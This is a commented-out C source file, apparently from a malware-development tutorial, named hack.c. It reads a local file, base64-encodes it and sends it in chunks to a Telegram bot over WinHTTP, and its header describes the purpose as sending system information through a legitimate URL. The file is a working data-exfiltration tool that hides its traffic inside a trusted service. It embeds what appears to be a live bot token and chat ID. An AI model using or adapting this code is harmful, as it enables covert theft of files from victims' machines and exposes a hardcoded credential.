// /*
//  * hack.c
//  * sending systeminfo via legit URL. Telegram API
//  * author @cocomelonc
// */
// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <windows.h>
// #include <winhttp.h>
// #include <wincrypt.h>

// #define MAX_TG_MSG_SIZE 512 // by limit 4096

// // send data to Telegram channel using winhttp
// int sendToTgBot(const char* message) {
//   const char* chatId = "5547299598";
//   HINTERNET hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
//   if (!hSession) return 1;

//   HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
//   if (!hConnect) { WinHttpCloseHandle(hSession); return 1; }

//   HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
//   if (!hRequest) {
//     WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 1;
//   }

//   // I hope this fucking thing is worked
//   char requestBody[1024] = {0};
//   const char* prefix = "chat_id=5547299598&text=";
//   size_t prefixLen = strlen(prefix);
//   size_t msgLen = strlen(message);

//   if (prefixLen + msgLen >= sizeof(requestBody)) {
//     fprintf(stderr, "Quack! message too long for requestBody\n");
//     return 1;
//   }

//   memcpy(requestBody, prefix, prefixLen);
//   memcpy(requestBody + prefixLen, message, msgLen);

//   BOOL result = WinHttpSendRequest(hRequest,
//     L"Content-Type: application/x-www-form-urlencoded\r\n",
//     -1,
//     requestBody,
//     (DWORD)(prefixLen + msgLen),
//     (DWORD)(prefixLen + msgLen),
//     0);

//   if (!result) {
//     fprintf(stderr, "WinHttpSendRequest error %lu\n", GetLastError());
//     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
//     return 1;
//   }

//   WinHttpReceiveResponse(hRequest, NULL);

//   WinHttpCloseHandle(hRequest);
//   WinHttpCloseHandle(hConnect);
//   WinHttpCloseHandle(hSession);
//   return 0;
// }


// // encoding base64
// char* base64_encode(const BYTE* buffer, DWORD length) {
//   DWORD base64Len = 0;
//   CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
//   char* base64 = (char*)malloc(base64Len + 1);
//   CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64Len);
//   base64[base64Len] = '\0';
//   return base64;
// }

// // base64 fs
// void sendBase64File(const char* filePath) {
//   FILE* f = fopen(filePath, "rb");
//   if (!f) {
//     perror("fopen");
//     return;
//   }

//   fseek(f, 0, SEEK_END);
//   long size = ftell(f);
//   rewind(f);

//   BYTE* data = malloc(size);
//   fread(data, 1, size, f);
//   fclose(f);

//   char* encoded = base64_encode(data, size);
//   free(data);

//   size_t len = strlen(encoded);
//   printf("sending base64-encoded data (%zu bytes)...\n", len);
//   for (size_t i = 0; i < len; i += MAX_TG_MSG_SIZE) {
//     char chunk[4096] = {0};
//     strncpy(chunk, encoded + i, MAX_TG_MSG_SIZE);
//     printf("%s\n", chunk);
//     sendToTgBot(chunk);
//     Sleep(1000); // sleep
//   }

//   free(encoded);
//   printf("done...\n");
// }

// int main() {
//   const char* filePath = "cat1.png";
//   sendBase64File(filePath);
//   return 0;
// }
